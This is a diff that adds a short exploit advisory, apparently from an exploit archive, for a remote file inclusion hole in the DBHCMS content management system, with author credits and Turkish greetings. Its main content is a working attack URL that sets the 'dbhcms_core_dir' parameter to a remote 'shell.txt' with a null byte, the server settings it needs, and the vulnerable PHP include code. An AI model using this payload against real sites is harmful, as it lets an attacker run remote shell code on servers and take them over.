@@ -1,0 +1,59 @@
+#############################################################
+#  DBHCMS - Web Content Management System RFI Vulnerability
+   
+    http://www.drbenhur.com/
+   
+# Author: Gamoscu
+
+# Site: www.1923turk.biz
+
+  https://gamoscu.wordpress.com/
+
+
+Manas58 - Baybora - Delibey - Tiamo - Psiko - Turco - infazci - X-TRO
+
+
+Hosgeldin medine bebek Allah anali babali buyutsun pasam 
+  
+##############################################################
+
+# Exploit: 
+            
+
+Vuln file: index.php
+
+
+Exploit:
+
+
+target: ?dbhcms_core_dir=http://site.com/shell.txt%00
+
+
+/ * Need register_globals = ON and allow_url_include = ON without a second yuzaetsya as LFI * /
+ 
+
+index.php
+
+function dbhcms_init($core) { 
+        $init  = $core.'init.php'; 
+        $page  = $core.'page.php'; 
+        if ((is_file($init))&&(is_file($page))) { 
+            require_once($init); 
+            require_once($page); 
+        } else { 
+            die('<div style="color: #872626; font-weight: bold;"> 
+                        FATAL ERROR - Could not find the initialzation files.  
+                        Please check the "$dbhcms_core_dir" parameter in the "config.php" and make  
+                        shure the directory is correct. 
+                    </div>'); 
+        } 
+    } 
+...... 
+dbhcms_init($GLOBALS['dbhcms_core_dir']); 
+
+
+
+
+Vatan Lafla Degil Eylemle Sevilir 
+
+Kiskananlar catlasin Zorunuza Gitmesin
